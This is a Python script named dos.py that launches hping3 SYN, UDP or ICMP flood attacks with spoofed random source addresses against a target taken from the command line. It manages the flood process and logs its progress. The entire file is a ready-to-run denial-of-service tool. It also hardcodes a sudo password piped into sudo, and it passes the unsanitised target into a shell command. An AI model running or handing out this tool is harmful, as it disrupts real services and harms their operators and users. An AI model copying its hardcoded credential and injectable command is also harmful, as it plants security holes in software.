import os
import sys
import subprocess
import signal
import time
import atexit
from datetime import datetime

# === Global variables for process management ===
attack_process = None
running = True

# === Setup folders ===
log_dir = "logs"
os.makedirs(log_dir, exist_ok=True)

log_file = os.path.join(log_dir, "dos_attack.log")

# === Logger ===
def log(msg):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    full = f"{timestamp} - {msg}"
    print(full, flush=True)
    try:
        with open(log_file, "a") as f:
            f.write(full + "\n")
    except Exception as e:
        print(f"Error writing to log file: {e}", flush=True)

# === Cleanup function ===
def cleanup():
    """Clean up any running attack processes"""
    global attack_process, running
    running = False
    
    if attack_process:
        try:
            log("[!] Cleaning up attack process...")
            
            # Get the process group ID
            pgid = os.getpgid(attack_process.pid)
            
            # Send SIGTERM to the process group
            os.killpg(pgid, signal.SIGTERM)
            
            # Wait for the process to terminate
            try:
                attack_process.wait(timeout=3)
                log("[✓] Attack process terminated gracefully.")
            except subprocess.TimeoutExpired:
                # If not terminated, send SIGKILL to the process group
                log("[!] Force killing attack process group...")
                os.killpg(pgid, signal.SIGKILL)
                attack_process.wait()
                log("[✓] Attack process group force killed.")
                
        except Exception as e:
            log(f"[!] Error during cleanup: {e}")
        finally:
            attack_process = None
    
    # Additional cleanup: kill any remaining hping3 processes
    try:
        subprocess.run(["sudo", "pkill", "-f", "hping3"], 
                      capture_output=True, timeout=5)
        log("[✓] Cleaned up any remaining hping3 processes.")
    except Exception as e:
        log(f"[!] Error cleaning up hping3 processes: {e}")

# === Signal handlers ===
def signal_handler(signum, frame):
    """Handle termination signals"""
    log(f"[!] Received signal {signum}. Stopping attack...")
    cleanup()
    sys.exit(0)

def sigtstp_handler(signum, frame):
    """Handle the Ctrl+Z signal (SIGTSTP)"""
    log("[!] Received Ctrl+Z (SIGTSTP). Stopping attack...")
    cleanup()
    sys.exit(0)

# Register signal handlers
signal.signal(signal.SIGTERM, signal_handler)
signal.signal(signal.SIGINT, signal_handler)  # Handle Ctrl+C
signal.signal(signal.SIGTSTP, sigtstp_handler)  # Handle Ctrl+Z

# Register cleanup function to run on exit
atexit.register(cleanup)

# === Check for target URL and attack type ===
if len(sys.argv) != 3:
    log("Usage: python3 dos.py <http[s]://target> <icmp|udp|syn>")
    sys.exit(1)

target = sys.argv[1]
attack_type = sys.argv[2].lower()

# Remove "http://" or "https://" from the target if present
if target.startswith("http://"):
    target = target[7:]
elif target.startswith("https://"):
    target = target[8:]

if attack_type not in ['icmp', 'udp', 'syn']:
    log("[!] Invalid attack type. Choose from: icmp, udp, syn.")
    sys.exit(1)

# === Attack Parameters ===
port = 80  # Default target port for HTTP (can be changed based on attack type)

# === Hardcoded sudo password ===
sudo_password = "GH0ST"

# === Launch Attack based on User Choice ===
log(f"[+] Launching {attack_type.upper()} flood attack on: {target}")

try:
    # Build the command based on attack type
    if attack_type == 'icmp':
        log(f"[+] Using ICMP flood attack on port {port}")
        cmd = f"echo {sudo_password} | sudo -S  hping3 --icmp -p {port} --flood --rand-source {target}"
    elif attack_type == 'udp':
        log(f"[+] Using UDP flood attack on port {port}")
        cmd = f"echo {sudo_password} | sudo -S hping3 --udp -p {port} --flood --rand-source {target}"
    elif attack_type == 'syn':
        log(f"[+] Using SYN flood attack on port {port}")
        cmd = f"echo {sudo_password} | sudo -S hping3 --syn -p {port} --flood --rand-source {target}"
    
    # Start the attack process
    attack_process = subprocess.Popen(
        cmd,
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        universal_newlines=True,
        preexec_fn=os.setsid  # Create new process group
    )
    
    log(f"[+] Attack process started with PID: {attack_process.pid}")
    
    # Monitor the process and output
    while running and attack_process.poll() is None:
        try:
            # Read output from the process
            output = attack_process.stdout.readline()
            if output:
                log(f"[HPING3] {output.strip()}")
            
            # Small delay to prevent excessive CPU usage
            time.sleep(0.1)
            
        except Exception as e:
            log(f"[!] Error reading process output: {e}")
            break
    
    # Check final status
    if attack_process.poll() is not None:
        return_code = attack_process.returncode
        if return_code == 0:
            log("[✓] Attack completed successfully.")
        else:
            log(f"[!] Attack process exited with code: {return_code}")
    else:
        log("[!] Attack process was terminated.")

except KeyboardInterrupt:
    log("[!] Attack interrupted by user (Ctrl+C).")
    cleanup()
    sys.exit(0)

except Exception as e:
    log(f"[!] Error during attack execution: {e}")
    cleanup()
    sys.exit(1)

finally:
    # Ensure cleanup runs
    cleanup()